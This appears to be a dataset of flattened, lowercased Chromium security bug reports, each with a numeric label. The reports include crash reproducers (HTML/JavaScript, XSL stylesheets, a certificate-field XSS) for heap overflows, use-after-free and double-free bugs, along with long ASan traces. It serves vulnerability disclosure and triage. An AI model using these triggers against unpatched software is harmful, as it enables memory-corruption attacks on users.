stylesheetcontents parsestringatline wtf string const int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/css/stylesheetcontents.cpp:311 6 in webcore stylesheetcontents parsestring wtf string const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/css/stylesheetcontents.cpp:302 7 in webcore processinginstruction parsestylesheet wtf string const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/processinginstruction.cpp:244 8 in refptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/wtf/wtf/refptr.h:56 9 in refptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/wtf/wtf/refptr.h:56 10 in webcore cachedcssstylesheet data wtf passrefptr webcore sharedbuffer bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/cache/cachedcssstylesheet.cpp:112 11 in webcore subresourceloader didfinishloading double media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/subresourceloader.cpp:278 12 in webkit_glue weburlloaderimpl context oncompletedrequest net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const media/chromium/chromium/depot_tools/src/webkit/glue/weburlloader_impl.cc:665 13 in resourcedispatcher onrequestcomplete int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:478 14 in bool resourcemsg_requestcomplete dispatch resourcedispatcher resourcedispatcher void resourcedispatcher int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const ipc message const resourcedispatcher resourcedispatcher void resourcedispatcher int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const media/chromium/chromium/depot_tools/src/./content/common/resource_messages.h:172 15 in resourcedispatcher dispatchmessage ipc message const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:548 16 in resourcedispatcher onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:315 17 in childthread onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/common/child_thread.cc:174 18 in ipc channelproxy context ondispatchmessage ipc message const media/chromium/chromium/depot_tools/src/ipc/ipc_channel_proxy.cc:250 19 in base internal invokehelper false void base internal runnableadapter void ipc channelproxy context ipc message const void ipc channelproxy context const ipc message const makeitso base internal runnableadapter void ipc channelproxy context ipc message const ipc channelproxy context const ipc message const media/chromium/chromium/depot_tools/src/./base/bind_internal.h:897 20 in messageloop runtask base pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:456 21 in messageloop deferorrunpendingtask base pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:467 22 in messageloop dowork media/chromium/chromium/depot_tools/src/base/message_loop.cc:643 23 in base messagepumpdefault run base messagepump delegate media/chromium/chromium/depot_tools/src/base/message_pump_default.cc:28 24 in messageloop runinternal media/chromium/chromium/depot_tools/src/base/message_loop.cc:415 6506 aborting stats 9m malloced 11m for red zones by 22122 calls stats 0m realloced by 111 calls stats 7m freed by 12713 calls stats 0m really freed by 0 calls stats 56m 14345 full pages mmaped in 14 calls mmaps by size class 8:32766 9:8191 10:4095 11:2047 12:1024 13:512 14:256 15:128 16:128 17:32 18:16 19:8 mallocs by size class 8:17359 9:1545 10:2461 11:292 12:92 13:96 14:116 15:41 16:110 17:8 18:1 19:1 frees by size class 8:8905 9:1000 10:2311 11:130 12:44 13:75 14:104 15:33 16:105 17:4 18:1 19:1 rfrees by size class stats malloc large 10 small slow 167 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd	11
heap-buffer-overflow in upsamplebgralinepairsse2 vulnerability details webp decoder integer overflow in buffer.c checkdecbuffer leads to heap-buffer-overflow overflow occurs in ok buf stride height buf size all types are int it triggers when vp8x chunk declares a resolution of x 1 vp8 chunk declares a resolution of 1 x then buf stride 4 height buf stride height overflows to negative buffer check should fail but succeeds and the buffer is overflown version chrome version 21.0.1163.0 developer build 140236 operating system 64 bit linux reproduction case reproducer bad.webp is attached but for me an img tag was necessary for chrome to start decoding asd/webp/bad.html	11
reproduceable crash changing tabs while a specific text field has focus chrome version 20.0.1132.57 operating system google chrome 20.0.1132.57 official build 145807 os linux webkit 536.11 122148 javascript v8 3.10.8.20 flash 11.3.31.115 user agent mozilla/5.0 x11 linux x86_64 applewebkit/536.11 khtml like gecko chrome/20.0.1132.57 safari/536.11 url if applicable where crash occurred can you reproduce this crash yes what steps will reproduce this crash or if it s not reproducible what were you doing just before the crash 1 open two tabs in chrome in one tab go to the site listed above 2 enter 94089 in the existing move to new address form click check 3 after the page redirect give the first textfield on the page the focus i.e current acct 4 attempt to change tabs by clicking on the 2nd tab header 5 crash errors from debug log at the time of the crash crash dump id a145c97649b7be32 0k 6520:6520:4982425032 error gl_context_glx.cc 167 could n't make context current with x drawable 6520:6520:4982426192 error gl_context_glx.cc 167 could n't make context current with x drawable 6520:6520:4982432404 error x11_util.cc 1221 x error detected serial 226 error_code 130 glxbaddrawable request_code 128 minor_code 5 x_glxmakecurrent 6520:6520:4982432503 error x11_util.cc 1221 x error detected serial 228 error_code 8 badmatch invalid parameter attributes request_code 128 minor_code 5 x_glxmakecurrent 6520:6520:4983705513 error gl_context_glx.cc 167 could n't make context current with x drawable 6520:6520:4983707862 error gl_context_glx.cc 167 could n't make context current with x drawable please note that issues filed with no information filled in above will be marked as wontfix do not change below this line report_id a145c97649b7be32	11
security bad cast in webcore calendarpickerelement hostinput vulnerability details chrome tab crashed due to heap buffer overflow when date input element is changed to text input element on onclick event think it happens because of a cast error similar to issue 136145 which happens with password generation asan backtrace is also similar except that this issue happens on calendarpickerelement.cpp version chrome version 20.0.1132.57 stable 22.0.1210.0 146980 dev operating system ubuntu 12.04 64 bit reproduction case 1 download and host date.html 2 open date.html on chrome 3 click on the down arrow icon on date input field tab will crash for crashes please include the following additional information type of crash browser crash state asan output 5013 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 1 at thread t0 0 in webcore calendarpickerelement defaulteventhandler webcore event third_party/webkit/source/webcore/html/shadow/calendarpickerelement.cpp:92 1 in wtf passrefptr webcore event operator const third_party/webkit/source/wtf/wtf/passrefptr.h:76 2 in webcore mouseeventdispatchmediator dispatchevent webcore eventdispatcher const third_party/webkit/source/webcore/dom/mouseevent.cpp:207 3 in webcore eventdispatcher dispatchevent webcore node wtf passrefptr webcore eventdispatchmediator third_party/webkit/source/webcore/dom/eventdispatcher.cpp:128 4 in webcore node dispatchmouseevent webcore platformmouseevent const wtf atomicstring const int webcore node third_party/webkit/source/webcore/dom/node.cpp:2638 5 in webcore eventhandler updatemouseeventtargetnode webcore node webcore platformmouseevent const bool third_party/webkit/source/webcore/page/eventhandler.cpp:2217 6 in wtf refptr webcore node operator webcore node wtf refptr webcore node const third_party/webkit/source/wtf/wtf/refptr.h:70 7 in webcore eventhandler handlemousemoveevent webcore platformmouseevent const webcore hittestresult bool third_party/webkit/source/webcore/page/eventhandler.cpp:1820 8 in webcore eventhandler mousemoved webcore platformmouseevent const third_party/webkit/source/webcore/page/eventhandler.cpp:1692 9 in webkit pagewidgeteventhandler handlemousemove webcore frame webkit webmouseevent const third_party/webkit/source/webkit/chromium/src/pagewidgetdelegate.cpp:197 10 in webkit pagewidgetdelegate handleinputevent webcore page webkit pagewidgeteventhandler webkit webinputevent const third_party/webkit/source/webkit/chromium/src/pagewidgetdelegate.cpp:118 11 in webkit webviewimpl handleinputevent webkit webinputevent const third_party/webkit/source/webkit/chromium/src/webviewimpl.cpp:1805 12 in renderwidget onhandleinputevent ipc message const content/renderer/render_widget.cc:569 13 in bool ipc message dispatch renderwidget renderwidget ipc message const renderwidget renderwidget void renderwidget ipc message const ipc/ipc_message.h:167 14 in renderviewimpl onmessagereceived ipc message const content/renderer/render_view_impl.cc:967 15 in messagerouter routemessage ipc message const content/common/message_router.cc:47 16 in messagerouter onmessagereceived ipc message const content/common/message_router.cc:40 17 in childthread onmessagereceived ipc message const content/common/child_thread.cc:209 18 in ipc channelproxy context ondispatchmessage ipc message const ipc/ipc_channel_proxy.cc:257 19 in base callback void run const base/callback.h:388 20 in messageloop deferorrunpendingtask base pendingtask const base/message_loop.cc:467 21 in messageloop dowork base/message_loop.cc:643 22 in base messagepumpdefault run base messagepump delegate base/message_pump_default.cc:28 23 in messageloop runinternal base/message_loop.cc:415 24 in base runloop afterrun base/run_loop.cc:84 25 in messageloop run base/message_loop.cc:299 26 in renderermain content mainfunctionparams const content/renderer/renderer_main.cc:270 27 in content runzygote content mainfunctionparams const content contentmaindelegate content/app/content_main_runner.cc:330 28 in content runnamedprocesstypemain std basic_string char std char_traits char std allocator char const content mainfunctionparams const content contentmaindelegate content/app/content_main_runner.cc:383 29 in content contentmainrunnerimpl run content/app/content_main_runner.cc:630 30 in content contentmain int char const content contentmaindelegate content/app/content_main.cc:35 31 in chromemain chrome/app/chrome_main.cc:32 32 in main chrome/app/chrome_exe_main_gtk.cc:18 33 in libc_start_main build/buildd/eglibc-2.15/csu/libc-start.c:258 is located 24 bytes to the right of 112-byte region allocated by thread t0 here 0 in 1 in 2 in 3 in 4 in 5 in 6 in 7 in 8 in 9 in 10 in 11 in 12 in 13 in 14 in 15 in 16 in 17 in 18 in 19 in 20 in 21 in 22 in 5013 aborting stats 56m malloced 66m for red zones by 161233 calls stats 3m realloced by 2843 calls stats 54m freed by 150309 calls stats 0m really freed by 0 calls stats 152m 38934 full pages mmaped in 38 calls mmaps by size class 8:131064 9:40955 10:8190 11:2047 12:1024 13:1536 14:256 15:128 16:128 17:384 18:16 19:8 mallocs by size class 8:118284 9:33477 10:5823 11:1298 12:464 13:1140 14:198 15:101 16:65 17:379 18:1 19:3 frees by size class 8:108622 9:32823 10:5546 11:1100 12:388 13:1115 14:186 15:93 16:60 17:372 18:1 19:3 rfrees by size class stats malloc large 383 small slow 608 shadow byte and word fa fa fa fa fa fa fa fa fa more shadow bytes fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa	11
heap-buffer-overflow in webcore renderblock linebreaker nextlinebreak vulnerability details heap buffer overflow in webcore renderblock computeinlinedirectionpositionsforline version chrome version stable beta dev chromium 20.0.1089.0 developer build 130071 os linux webkit 536.6 112724 operating system 64bit linux reproduction case html head style el0 webkit-writing-mode vertical-lr el0 first-line webkit-text-stroke 1px el1 display table-footer-group c1 webkit-appearance webkit-input-speech-button webkit-text-combine horizontal display table style script onload function el0=document.createelement rt el0.setattribute id el0 el0.setattribute class c1 document.body.appendchild el0 el0.appendchild document.createtextnode unescape ud800'+array 1024 join a u3000a el1=document.createelement div el1.setattribute id el1 el1.setattribute class c1 el0.appendchild el1 script head body body html alternatively remove line display table for a crash one stack frame higher up for crashes please include the following additional information type of crash renderer asan crash state 14411 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 2 at thread t0 0 in webcore font expansionopportunitycount unsigned short const unsigned long webcore textdirection bool 0 1 in webcore renderblock computeinlinedirectionpositionsforline webcore rootinlinebox webcore lineinfo const webcore bidirun webcore bidirun bool wtf hashmap webcore inlinetextbox const std pair wtf vector webcore simplefontdata is located 2048 bytes to the right of 34-byte region allocated by thread t0 here 0 in malloc 0 1 in wtf fastmalloc unsigned long 0 2 in wtf stringimpl create unsigned short const unsigned int 0	11
bad cast with run-ins and input vulnerability details jumps to 0 11019 error addresssanitizer crashed on unknown address pc sp bp t0 addresssanitizer can not provide additional info aborting version chrome version stable dev chromium 22.0.1189.0 developer build 144460 os linux webkit 537.1 121326 operating system 64bit precise reproduction case html head style el0 webkit-appearance inherit c0 display run-in style script onload function el0=document.createelement input el0.setattribute id el0 document.body.appendchild el0 document.body.appendchild document.createelement div document.body.offsettop el0.setattribute class c0 script head body body html for crashes please include the following additional information type of crash renderer asan crash state 11019 error addresssanitizer crashed on unknown address pc sp bp t0 addresssanitizer can not provide additional info aborting	11
spdy pushed stream crash accessing in spdy/2 enabled by passing enable-npn accessing url will result in a crash was n't able to reproduce the issue in spdy/3 void spdystream pushedstreamreplaydata int rv delegate onresponsereceived response response_time ok if rv err_incomplete_spdy_headers we do n't have complete headers assume we re waiting for another headers frame since we do n't have headers we had better not have any pending data frames dcheck_eq 0u pending_buffers_.size crash return in m20 spdy/2 is enabled for a very small percentage of users should we fix or support pushed streams in spdy/2	11
security race condition with workers and sync xmlhttprequests vulnerability details race condition with workers and sync xmlhttprequests version chrome version trunk chromium 22.0.1199.0 developer build 145612 os mac os x webkit 537.1 trunk 121126 javascript v8 3.12.9 operating system osx lion 64bit precise reproduction case script new worker m.js settimeout location.reload 200 script m.js for var i=0 i 100 i req new xmlhttprequest req.open get a false req.send http schema required for crashes please include the following additional information type of crash asan tab crash state 18424 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 4 at thread t98 0 in webcore resourceresponse resourceresponse 0 1 in webcore xmlhttprequest xmlhttprequest 0 2 in webcore xmlhttprequest xmlhttprequest 0 is located 0 bytes inside of 50-byte region freed by thread t0 here 0 in free 0 1 in webcore resourceresponse resourceresponse 0 2 in webcore cachedresource cachedresource 0 3 in webcore cachedrawresource cachedrawresource 0 osx 21806 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 4 at thread t20 0 in webcore resourceresponse resourceresponse in chromium framework 976 1 in webcore xmlhttprequest xmlhttprequest in chromium framework 1341 2 in webcore xmlhttprequest xmlhttprequest in chromium framework 17 3 in webcore domdata derefobject webcore wrappertypeinfo void in chromium framework 53 is located 0 bytes inside of 40-byte region freed by thread t0 here 0 in anonymous namespace mz_free malloc_zone_t void in chromium helper 80 1 in wrap_free in chromium helper 83 2 in webcore resourceresponse resourceresponse in chromium framework 501 3 in webcore cachedresource cachedresource in chromium framework 692 4 in webcore cachedrawresource cachedrawresource in chromium framework 17	11
heap-use-after-free in webkit ppapi ppb_urlloader_impl filluserbuffer detailed report fuzzer fermin_swf_bitflip crash type heap-use-after-free write 1 crash address crash state crash stack webkit ppapi ppb_urlloader_impl filluserbuffer webkit ppapi ppb_urlloader_impl didreceivedata free stack ppapi proxy ppb_urlloader_proxy onreadcallback pp completioncallbackfactory ppapi proxy ppb_urlloader_proxy ppapi proxy proxynonthreadsafethr	11
security heap-use-after-free in xsltgenerateidfunction vulnerability details when generate-id is applied on the context node inside nested templates a use after free occurs in libxslt this does n't happen if generate-id is applied to the current node version xsltproc+asan libxml 20800 libxslt 10126 and libexslt 815 chromium+asan 21.0.1180.49 147161 reproduction case xsl stylesheet xmlns xsl version 1.0 xsl template match name level1 xsl call-template name level2 xsl template xsl template name level2 xsl for-each select namespace xsl value-of select generate-id xsl for-each xsl template xsl stylesheet additional information asan xsltproc log more verbose than the chromium one 5023 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 4 at thread t0 0 00000000000538da xsltgenerateidfunction xmlnsptr ns xmlnsptr cur if ns context null doc ns context else doc ctxt context doc 538da e8 19 37 fc ff callq 16ff8 asan_report_load8 plt 1 xmlxpathcompopeval 2 xmlxpathcompopeval 3 xmlxpathruneval 4 xmlxpathcompiledevalinternal 5 xmlxpathcompiledeval 6 xsltvalueof 7 xsltapplysequenceconstructor 8 xsltforeach 9 xsltapplysequenceconstructor 10 xsltapplyxslttemplate 11 xsltcalltemplate 12 xsltapplysequenceconstructor 13 xsltapplyxslttemplate 14 xsltprocessonenode 15 xsltdefaultprocessonenode 16 xsltprocessonenode 17 xsltapplystylesheetinternal 18 xsltprocess 19 main 20 libc_start_main is located 8 bytes inside of 48-byte region 0 0000000000415aa2 free 415aa2 4c 8d b5 d8 fd ff ff lea rbp r14 1 xmlxpathfreenodeset 2 xmlxpathfreeobject 3 xsltgenerateidfunction 4 xmlxpathcompopeval 5 xmlxpathcompopeval 6 xmlxpathruneval 7 xmlxpathcompiledevalinternal 8 xmlxpathcompiledeval 9 xsltvalueof 10 xsltapplysequenceconstructor 11 xsltforeach 12 xsltapplysequenceconstructor 13 xsltapplyxslttemplate 14 xsltcalltemplate 15 xsltapplysequenceconstructor 16 xsltapplyxslttemplate 17 xsltprocessonenode 18 xsltdefaultprocessonenode 19 xsltprocessonenode 20 xsltapplystylesheetinternal 21 xsltprocess 22 main 23 libc_start_main	7
heap-double-free in xsltcompilesteppattern vulnerability details when processing an invalid xpath expression libxslt will attempt to free twice a specific object version xsltproc libxml 20706 libxslt 10126 and libexslt 815 chromium 18.0.1025.151 dev 130497 linux ubuntu 10.04 chromium+asan 21.0.1180.49 147161 reproduction case xsl stylesheet xmlns xsl version 1.0 xsl template match key text should crash libxslt because of a double free xsl template xsl stylesheet additional information valgrind xsltproc 31327 invalid free delete delete 31327 at free vg_replace_malloc.c:366 31327 by xsltcompilesteppattern pattern.c:1690 31327 by xsltcompilerelativepathpattern pattern.c:1710 31327 by xsltcompilepatterninternal pattern.c:1795 31327 by xsltaddtemplate pattern.c:2040 31327 by xsltparsestylesheettop xslt.c:5413 31327 by xsltparsestylesheetprocess xslt.c:6414 31327 by xsltparsestylesheetimporteddoc xslt.c:6627 31327 by xsltparsestylesheetdoc xslt.c:6666 31327 by main xsltproc.c:830 31327 address is 0 bytes inside a block of size 5 free d 31327 at free vg_replace_malloc.c:366 31327 by xsltcompileidkeypattern pattern.c:1497 31327 by xsltcompilesteppattern pattern.c:1559 31327 by xsltcompilerelativepathpattern pattern.c:1710 31327 by xsltcompilepatterninternal pattern.c:1795 31327 by xsltaddtemplate pattern.c:2040 31327 by xsltparsestylesheettop xslt.c:5413 31327 by xsltparsestylesheetprocess xslt.c:6414 31327 by xsltparsestylesheetimporteddoc xslt.c:6627 31327 by xsltparsestylesheetdoc xslt.c:6666 31327 by main xsltproc.c:830 31327 compilation error file df.xsl line 2 element template xsltcompilepattern failed to compile key text asan chromium 2558 error addresssanitizer attempting double-free on 0 00000000092a5942 free 92a5942 4c 8d b5 d8 fd ff ff lea rbp r14 1 xsltcompilesteppattern 2 xsltcompilerelativepathpattern 3 xsltcompilepatterninternal 4 xsltaddtemplate 5 xsltparsestylesheetprocess 6 xsltparsestylesheetimporteddoc 7 xsltparsestylesheetdoc 8 zn7webcore13xslstylesheet17compilestylesheetev 9 zn7webcore13xsltprocessor17transformtostringepns_4nodeern3wtf6stringes5_s5 10 zn7webcore13xsltprocessor19transformtofragmentepns_4nodeepns_8documente 11 zn7webcore15v8xsltprocessor27transformtofragmentcallbackerkn2v89argumentse 12 zn2v88internall21builtin_handleapicallens0_12_global__n_116builtinargumentsilns0_21builtinextraargumentse1eeepns0_7isolatee 19 zn2v88internall6invokeebns0_6handleins0_10jsfunctioneeens1_ins0_6objecteeeips5_pb 20 zn2v88function4callens_6handleins_6objecteeeipns1_ins_5valueeee 21 zn7webcore7v8proxy24instrumentedcallfunctionepns_5frameen2v86handleins3_8functioneeens4_ins3_6objecteeeipns4_ins3_5valueeee 22 zn7webcore7v8proxy12callfunctionen2v86handleins1_8functioneeens2_ins1_6objecteeeipns2_ins1_5valueeee 23 zn7webcore19v8lazyeventlistener20calllistenerfunctionepns_22scriptexecutioncontexten2v86handleins3_5valueeeepns_5evente 24 zn7webcore23v8abstracteventlistener18invokeeventhandlerepns_22scriptexecutioncontextepns_5eventen2v86handleins5_5valueeee 25 zn7webcore23v8abstracteventlistener11handleeventepns_22scriptexecutioncontextepns_5evente 26 zn7webcore11eventtarget18fireeventlistenersepns_5eventepns_15eventtargetdataern3wtf6vectorins_23registeredeventlistenerelm1eee 27 zn7webcore11eventtarget18fireeventlistenersepns_5evente 28 zn7webcore9domwindow13dispatcheventen3wtf10passrefptrins_5eventeeens2_ins_11eventtargeteee 29 zn7webcore9domwindow17dispatchloadeventev is located 0 bytes inside of 5-byte region freed by thread t0 here 0 00000000092a5942 free 92a5942 4c 8d b5 d8 fd ff ff lea rbp r14 1 xsltcompilesteppattern 2 xsltcompilerelativepathpattern 3 xsltcompilepatterninternal 4 xsltaddtemplate 5 xsltparsestylesheetprocess 6 xsltparsestylesheetimporteddoc 7 xsltparsestylesheetdoc 8 zn7webcore13xslstylesheet17compilestylesheetev 9 zn7webcore13xsltprocessor17transformtostringepns_4nodeern3wtf6stringes5_s5 10 zn7webcore13xsltprocessor19transformtofragmentepns_4nodeepns_8documente 11 zn7webcore15v8xsltprocessor27transformtofragmentcallbackerkn2v89argumentse 12 zn2v88internall21builtin_handleapicallens0_12_global__n_116builtinargumentsilns0_21builtinextraargumentse1eeepns0_7isolatee 19 zn2v88internall6invokeebns0_6handleins0_10jsfunctioneeens1_ins0_6objecteeeips5_pb 20 zn2v88function4callens_6handleins_6objecteeeipns1_ins_5valueeee 21 zn7webcore7v8proxy24instrumentedcallfunctionepns_5frameen2v86handleins3_8functioneeens4_ins3_6objecteeeipns4_ins3_5valueeee 22 zn7webcore7v8proxy12callfunctionen2v86handleins1_8functioneeens2_ins1_6objecteeeipns2_ins1_5valueeee 23 zn7webcore19v8lazyeventlistener20calllistenerfunctionepns_22scriptexecutioncontexten2v86handleins3_5valueeeepns_5evente 24 zn7webcore23v8abstracteventlistener18invokeeventhandlerepns_22scriptexecutioncontextepns_5eventen2v86handleins5_5valueeee 25 zn7webcore23v8abstracteventlistener11handleeventepns_22scriptexecutioncontextepns_5evente 26 zn7webcore11eventtarget18fireeventlistenersepns_5eventepns_15eventtargetdataern3wtf6vectorins_23registeredeventlistenerelm1eee 27 zn7webcore11eventtarget18fireeventlistenersepns_5evente 28 zn7webcore9domwindow13dispatcheventen3wtf10passrefptrins_5eventeeens2_ins_11eventtargeteee previously allocated by thread t0 here 0 00000000092a5a02 malloc 92a5a02 4c 8d b5 d8 fd ff ff lea rbp r14 1 xmlstrndup 2 xsltscanncname 3 xsltcompilesteppattern 4 xsltcompilerelativepathpattern 5 xsltcompilepatterninternal 6 xsltaddtemplate 7 xsltparsestylesheetprocess 8 xsltparsestylesheetimporteddoc 9 xsltparsestylesheetdoc 10 zn7webcore13xslstylesheet17compilestylesheetev 11 zn7webcore13xsltprocessor17transformtostringepns_4nodeern3wtf6stringes5_s5 12 zn7webcore13xsltprocessor19transformtofragmentepns_4nodeepns_8documente 13 zn7webcore15v8xsltprocessor27transformtofragmentcallbackerkn2v89argumentse 14 zn2v88internall21builtin_handleapicallens0_12_global__n_116builtinargumentsilns0_21builtinextraargumentse1eeepns0_7isolatee	7
heap-buffer-overflow in xsltapplytemplates vulnerability details when applying templates to nodes selected by namespace a out-of-bounds read is performed later this value is used during unlinking of nodes leading to a write error in xmlunlinknode version xsltproc libxml 20706 libxslt 10126 and libexslt 815 chromium 18.0.1025.151 dev 130497 linux ubuntu 10.04 chromium+asan 21.0.1180.49 147161 reproduction case xsl stylesheet xmlns xsl version 1.0 xsl template match xsl for-each select namespace xsl apply-templates xsl for-each xsl template xsl stylesheet additional information valgrind xsltproc 5547 invalid read of size 4 5547 at xsltapplytemplates transform.c:4837 5547 by xsltapplysequenceconstructor transform.c:2595 5547 by xsltforeach transform.c:5628 5547 by xsltapplysequenceconstructor transform.c:2595 5547 by xsltapplyxslttemplate transform.c:3044 5547 by xsltprocessonenode transform.c:2045 5547 by xsltprocessonenode transform.c:1875 5547 by xsltapplystylesheetinternal transform.c:6049 5547 by xsltprocess xsltproc.c:404 5547 by main xsltproc.c:867 5547 address is 0 bytes after a block of size 4 alloc d 5547 at malloc vg_replace_malloc.c:236 5547 by xmlstrndup xmlstring.c:45 5547 by xmlstrdup xmlstring.c:71 5547 by xmlxpathnodesetdupns xpath.c:3388 5547 by xmlxpathnodesetaddns xpath.c:3578 5547 by xmlxpathnodecollectandtest xpath.c:12421 5547 by xmlxpathcompopeval xpath.c:13375 5547 by xmlxpathcompopeval xpath.c:13862 5547 by xmlxpathruneval xpath.c:14432 5547 by xmlxpathcompiledevalinternal xpath.c:14792 5547 by xmlxpathcompiledeval xpath.c:14855 5547 by xsltforeach transform.c:5531 5547 invalid read of size 4 5547 at xmlunlinknode tree.c:3783 5547 by xsltapplytemplates transform.c:4898 5547 by xsltapplysequenceconstructor transform.c:2595 5547 by xsltforeach transform.c:5628 5547 by xsltapplysequenceconstructor transform.c:2595 5547 by xsltapplyxslttemplate transform.c:3044 5547 by xsltprocessonenode transform.c:2045 5547 by xsltprocessonenode transform.c:1875 5547 by xsltapplystylesheetinternal transform.c:6049 5547 by xsltprocess xsltproc.c:404 5547 by main xsltproc.c:867 5547 address is not stack d malloc d or recently free d 5547 5547 invalid write of size 4 5547 at xmlunlinknode tree.c:3783 5547 by xsltapplytemplates transform.c:4898 5547 by xsltapplysequenceconstructor transform.c:2595 5547 by xsltforeach transform.c:5628 5547 by xsltapplysequenceconstructor transform.c:2595 5547 by xsltapplyxslttemplate transform.c:3044 5547 by xsltprocessonenode transform.c:2045 5547 by xsltprocessonenode transform.c:1875 5547 by xsltapplystylesheetinternal transform.c:6049 5547 by xsltprocess xsltproc.c:404 5547 by main xsltproc.c:867 5547 address is not stack d malloc d or recently free d 5547 5547 process terminating with default action of signal 11 sigsegv 5547 access not within mapped region at address 5547 at xmlunlinknode tree.c:3783 5547 by xsltapplytemplates transform.c:4898 5547 by xsltapplysequenceconstructor transform.c:2595 5547 by xsltforeach transform.c:5628 5547 by xsltapplysequenceconstructor transform.c:2595 5547 by xsltapplyxslttemplate transform.c:3044 5547 by xsltprocessonenode transform.c:2045 5547 by xsltprocessonenode transform.c:1875 5547 by xsltapplystylesheetinternal transform.c:6049 5547 by xsltprocess xsltproc.c:404 5547 by main xsltproc.c:867 asan chromium 2107 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 4 at thread t0 0 0000000008a9763c xsltapplytemplates 8a9763c e8 ef fc 80 00 callq 92a7330 asan_report_load8 1 xsltapplysequenceconstructor 2 xsltforeach 3 xsltapplysequenceconstructor 4 xsltapplyxslttemplate 5 xsltprocessonenode 6 xsltprocessonenode 7 xsltapplystylesheetinternal is located 4 bytes to the right of 4-byte region	7
security xss in ssl certificate error page vulnerability details the issued to field in ssl certificate is printed in ssl certificate error page without html encoding its content version chrome version 21.0.1180.79 stable operating system windows 7 64 bit reproduction case by forcing traffic from chrome to go through burp suite program and fill html tags in generate a ca-signed certificate with a specific hostname this tags rendered every time a visit to https site occurred attachment show the burp suite configuration and the result in chrome	9
global-buffer-overflow in d_clear_bitmapxferproc detailed report fuzzer inferno_twister crash type global-buffer-overflow write 1 crash address crash state crash stack d_clear_bitmapxferproc skdraw drawpaint skcanvas internaldrawpaint regressed minimized testcase 1.00 kb	7
heap-buffer-overflow in skia bgraconvolve2d repro-file as attachment chrome version asan chromium 22.0.1192.0 15000 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 16 at thread t0 0 in skia bgraconvolve2d unsigned char const int bool skia convolutionfilter1d const skia convolutionfilter1d const int unsigned char bool 0 1 in skia imageoperations resizebasic skbitmap const skia imageoperations resizemethod int int skirect const 0 2 in skia imageoperations resize skbitmap const skia imageoperations resizemethod int int 0 3 in faviconhandler resizefaviconifneeded gfx image const 0 4 in faviconhandler setfavicon gurl const gurl const gfx image const history icontype 0 5 in faviconhandler ondiddownloadfavicon int gurl const bool gfx image const 0 6 in favicontabhelper ondiddownloadfavicon int gurl const bool skbitmap const 0 7 in bool iconhostmsg_diddownloadfavicon dispatch favicontabhelper favicontabhelper void favicontabhelper int gurl const bool skbitmap const ipc message const favicontabhelper favicontabhelper void favicontabhelper int gurl const bool skbitmap const 0 8 in favicontabhelper onmessagereceived ipc message const 0	11
security chrome extensions bug cause crash in all chrome processes vulnerability details hi i found an interesting crash in chrome s extension mechanism it s related to the xmlhttprequest object this crash is interesting becuase it carshes all chrome processes this crash its most likely a security-related issue as it is most likely caused by jumping to an illegal address segfault you can reproduce the crash by installing the attached chrome extension and execute it you can see in the example attached chrome crash after xhr.open get search_value format=json true i also added a crash dump for more information you can contact me via email nmoshe nds.com walla.com nir version chrome version 20.0.1132.57 stable operating system windows 7 reproduction case please include a demonstration of the security bug such as an attached i added a simple demo chrome extension that reproduce the crash manifest.json popup.html for crashes please include the following additional information type of crash browser all chrome processes crash state client id if relevant	9
heap-use-after-free in webkit webelement document detailed report fuzzer fermin_swf_bitflip crash type heap-use-after-free read 8 crash address crash state crash stack webkit webelement document webkit ppapi plugininstance getwindowobject free stack webcore containernode removeallchildren webcore document removedlastref minimized testcase 238.71 kb	11
security creating a loop in the dom tree 99 a dos version chrome version 20.0.1132.57 m stable operating system all source\webcore\dom\containernode.cpp bool containernode replacechild passrefptr node newchild node oldchild exceptioncode ec bool shouldlazyattach 1 checkreplacechild newchild.get oldchild ec if ec return false 2 removechild oldchild ec if ec return false add the new child ren for nodevector const_iterator it targets.begin it targets.end it if next 3 insertbeforecommon next.get child 4 updatetreeafterinsertion this child shouldlazyattach 1 check hierarchy and bail if but not only if oldchild is a descendant of newchild 2 by intercepting the removal event we mess up the dom a bit so that oldchild next is a descendant of newchild 3 this creates a loop in the dom newchild is accessible by next prev and next parent 4 infinite loop program received signal sigsegv segmentation fault webcore node typetag this error reading variable can not access memory at address at third_party/webkit/source/webcore/dom/node.h:703 703 nodetypetag typetag const return static_cast nodetypetag m_nodeflags nodetypetagmask this could be exploitable if there was a way not to crash inside updatetreeafterinsertion i do n't see how that could be done so you decide adding checkreplacechild just before the for would solve this problem	11
